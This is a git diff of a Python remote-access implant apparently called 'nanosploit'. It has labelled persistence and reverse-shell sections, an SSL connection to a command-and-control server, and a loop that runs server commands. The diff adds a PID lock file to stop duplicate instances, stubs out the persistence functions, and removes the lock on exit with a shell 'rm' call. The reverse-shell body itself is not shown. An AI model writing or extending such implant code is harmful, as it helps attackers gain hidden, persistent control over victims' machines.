@@ -3,29 +3,48 @@ import ssl
 import subprocess
 import os
 import platform
+import time
 
+# Static globals
+SYSTEM = platform.system()
+LOCK_PATH = "/tmp/nanosploit.lock" if SYSTEM == "Linux" else "C:/temp/nanosploit.lock"
 
 ''' PERSISTENCE '''
 
 
-def persistence_linux() -> bool:
-    # First check for lock
+def check_lock() -> bool:
+    # Check if the lock file exists
+    if os.path.isfile(LOCK_PATH):
+        # Get PID from lock file
+        with open(LOCK_PATH, 'r') as file:
+            pid = file.read().strip()
 
-    # Without holding a reference to our socket somewhere it gets garbage collected when the function exits
-    persistence_linux.lock_socket = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
-    try:
-        # The null byte (\0) means the socket is created in the abstract namespace instead of being created on the
-        # file system itself.
-        persistence_linux.lock_socket.bind('\0nanosploit')
-    except socket.error:
-        return True
+        # Check if PID is still running
+        if SYSTEM == 'Windows':
+            import ctypes
+            kernel32 = ctypes.windll.kernel32
+            handle = kernel32.OpenProcess(1, False, int(pid))
+            if handle != 0:
+                # Process is still running
+                return True
+        elif SYSTEM == "Linux":
+            if os.path.exists(f"/proc/{pid}"):
+                # Process is still running
+                return True
 
-    print("Persistence OK")
+    # Create the lock file and write the current process ID to it
+    with open(LOCK_PATH, 'w') as file:
+        file.write(str(os.getpid()))
+
     return False
 
 
-def persistence_windows() -> bool:
-    return False
+def persistence_linux():
+    pass
+
+
+def persistence_windows():
+    pass
 
 
 ''' REVERSE SHELL '''
@@ -85,17 +104,18 @@ def init_connection() -> ssl.SSLSocket:
 
 
 def main():
-    # Persistence
-    already_running = False
-    if platform.system() == "Linux":
-        already_running = persistence_linux()
-    elif platform.system() == "Windows":
-        already_running = persistence_windows()
-
-    if already_running:
+    # Exit if already running
+    if check_lock():
         print("Already running, exiting...")
         return
 
+    # Persistence
+    if platform.system() == "Linux":
+        persistence_linux()
+    elif platform.system() == "Windows":
+        persistence_windows()
+
+    # Start secure connection with C2
     ss = init_connection()
 
     # Handle server commands
@@ -117,7 +137,8 @@ def main():
             print("Lost server connection, exiting...")
             break
 
-    # Exit program
+    # Exit program and delete lock file
+    os.system(f"rm {LOCK_PATH}")
     exit(0)
 
 
